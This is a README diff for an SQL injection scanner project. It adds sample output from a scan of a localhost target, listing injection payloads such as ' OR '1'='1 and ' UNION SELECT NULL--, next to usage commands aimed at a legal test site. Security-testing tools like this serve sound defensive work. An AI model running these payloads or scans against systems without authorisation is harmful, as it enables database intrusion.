@@ -44,8 +44,33 @@ python advanced_sql_scanner.py "http://localhost:5000/?id=1"
 python advanced_sql_scanner.py "http://localhost:5000/?id=1" GET 10
 ### Scan Online Test Target (Legal)
 python advanced_sql_scanner.py "http://testphp.vulnweb.com/artists.php?artist=1" GET 5
+## Sample of output
+============================================================
+🔍 Advanced SQL Injection Scanner
+📡 Target: http://localhost:5000/?id=1
+⚙️  Method: GET | Threads: 10 | Delay: 0.3s
+============================================================
 
-*** ### 🏗️ Project Structure
+🔍 Grabbing Database Banner Information
+============================================================
+
+✅ Database Detected: SQLite
+
+[+] Testing 1 parameter(s) with 18 payloads
+[+] Using 10 concurrent threads
+
+[!] VULNERABLE [Error Based] id -> '
+[!] VULNERABLE [Error Based] id -> ' OR '1'='1
+[!] VULNERABLE [Union Based] id -> ' UNION SELECT NULL--
+
+============================================================
+📋 SCAN REPORT
+============================================================
+[!] Found 18 vulnerabilities
+
+✓ Report saved to: scan_report.html, scan_report.json
+
+ ### 🏗️ Project Structure
 Syntexhub_SQLi_Scanner/
 │
 ├── advanced_sql_scanner.py      # CLI version with concurrency
